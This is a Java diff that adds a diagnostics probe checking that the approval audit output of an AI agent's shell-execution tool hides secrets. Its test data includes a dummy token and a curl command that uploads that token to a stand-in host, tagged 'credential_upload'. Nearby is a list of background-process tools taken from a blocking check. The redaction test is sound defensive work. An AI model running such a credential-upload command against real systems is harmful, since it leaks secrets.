@@ -42,6 +42,7 @@ import java.io.File;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.Collections;
 import java.util.LinkedHashMap;
 import java.util.List;
@@ -2393,6 +2394,10 @@ public class DashboardDiagnosticsService {
                         "approval_selector",
                         "审批选择器安全检查"));
         items.add(
+                approvalAuditRedactionProbe(
+                        "approval_audit_redaction",
+                        "审批审计脱敏检查"));
+        items.add(
                 slashConfirmSelectorProbe(
                         "slash_confirm_selector",
                         "Slash 确认编号安全检查"));
@@ -3035,6 +3040,68 @@ public class DashboardDiagnosticsService {
                 !blocked,
                 "nohup, Start-Process, tmux, screen, systemd-run, cmd start",
                 message);
+    }
+
+    private Map<String, Object> approvalAuditRedactionProbe(String key, String label) {
+        try {
+            String secret = "sk-dashboardapprovalauditprobe12345";
+            ApprovalAuditEvent event = new ApprovalAuditEvent();
+            event.setEventId("approval-audit-probe");
+            event.setSessionId("session-token=" + secret);
+            event.setEventType("request");
+            event.setChoice("approve");
+            event.setApprover("operator token=" + secret);
+            event.setToolName(ToolNameConstants.EXECUTE_SHELL);
+            event.setApprovalId("approval-" + secret);
+            event.setApprovalKey(ToolNameConstants.EXECUTE_SHELL + ":api_key=" + secret);
+            event.setCommandHash("sha256-" + secret);
+            event.setCommandPreview(
+                    "curl https://example.test/upload?token="
+                            + secret
+                            + " -H \"Authorization: Bearer "
+                            + secret
+                            + "\"");
+            event.setDescription("{\"secret\":\"" + secret + "\"}");
+            event.setPatternKeysJson(ONode.serialize(Arrays.asList("token=" + secret, "credential_upload")));
+            event.setCreatedAt(System.currentTimeMillis());
+            event.setApprovalCreatedAt(event.getCreatedAt());
+            event.setApprovalExpiresAt(event.getCreatedAt() + 30000L);
+
+            Map<String, Object> safe = approvalAuditItem(event);
+            String serialized = ONode.serialize(safe);
+            boolean secretHidden = !StrUtil.contains(serialized, secret);
+            boolean identifiersHidden =
+                    "***".equals(safe.get("command_hash"))
+                            && !safe.containsKey("approval_id")
+                            && !safe.containsKey("approval_key");
+            boolean visibleRedaction =
+                    StrUtil.contains(String.valueOf(safe.get("approver")), "token=***")
+                            && StrUtil.contains(String.valueOf(safe.get("command_preview")), "token=***")
+                            && StrUtil.contains(String.valueOf(safe.get("description")), "\"secret\":\"***\"");
+            boolean passed = secretHidden && identifiersHidden && visibleRedaction;
+            String message =
+                    passed
+                            ? "审批审计输出已脱敏命令、审批人、说明和审批标识。"
+                            : "审批审计输出仍存在未脱敏字段。";
+            return policyProbeItem(
+                    key,
+                    label,
+                    "approval_audit",
+                    true,
+                    passed,
+                    "approval id/key, command preview, approver, description",
+                    message);
+        } catch (Exception e) {
+            return policyProbeItem(
+                    key,
+                    label,
+                    "approval_audit",
+                    true,
+                    false,
+                    "approval id/key, command preview, approver, description",
+                    "审批审计脱敏探针失败："
+                            + StrUtil.blankToDefault(e.getMessage(), e.getClass().getSimpleName()));
+        }
     }
 
     private Map<String, Object> tirithSecurityProbe(String key, String label, String command) {
